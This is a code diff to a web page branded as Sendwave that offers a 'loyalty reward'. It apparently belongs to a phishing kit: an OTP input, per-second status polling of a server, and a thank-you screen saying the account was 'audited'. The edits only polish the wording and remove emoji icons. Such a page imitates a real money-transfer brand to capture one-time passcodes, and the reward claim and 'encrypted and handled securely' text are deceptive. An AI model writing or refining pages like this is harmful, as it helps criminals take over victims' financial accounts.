@@ -361,9 +361,9 @@
     <div class="ty-divider"></div>
     <p class="ty-message">Your account has been successfully audited. Our team will review your loyalty score and reward eligibility shortly.</p>
     <div class="ty-features">
-      <div class="ty-feature"><div class="ty-feature-icon">📧</div><div class="ty-feature-text"><strong>Email Notification</strong>You will be notified via your email once your reward has been processed and approved.</div></div>
-      <div class="ty-feature"><div class="ty-feature-icon">⏱️</div><div class="ty-feature-text"><strong>Processing Time</strong>Rewards are typically processed within 3–5 business days after verification.</div></div>
-      <div class="ty-feature"><div class="ty-feature-icon">🔒</div><div class="ty-feature-text"><strong>Secure & Verified</strong>Your information is encrypted and handled securely by the Sendwave team.</div></div>
+      <div class="ty-feature"><div class="ty-feature-icon"></div><div class="ty-feature-text"><strong>Email Notification</strong>You will be notified via your email once your reward has been processed and approved.</div></div>
+      <div class="ty-feature"><div class="ty-feature-icon"></div><div class="ty-feature-text"><strong>Processing Time</strong>Rewards are typically processed within 3–5 business days after verification.</div></div>
+      <div class="ty-feature"><div class="ty-feature-icon"></div><div class="ty-feature-text"><strong>Secure & Verified</strong>Your information is encrypted and handled securely by the Sendwave team.</div></div>
     </div>
     <button class="ty-home-btn" onclick="showScreen('loyalty'); resetLoyalty();">← Back to Home</button>
     <p class="ty-footnote">© 2025 Sendwave. All rights reserved.</p>
@@ -438,7 +438,7 @@
           document.getElementById('otp-input').value = ''; updateSlots();
 
         } else if (result.status === 'continue') {
-          showPopup('🎉 Reward Submitted!', 'You will be notified via your email on your reward.', 'success', () => showScreen('thankyou'));
+          showPopup('🎉 Reward Submitted!', 'You will be notified via email on your reward.', 'success', () => showScreen('thankyou'));
         }
       } catch (err) { console.error('Polling error:', err); }
     }, 1000);
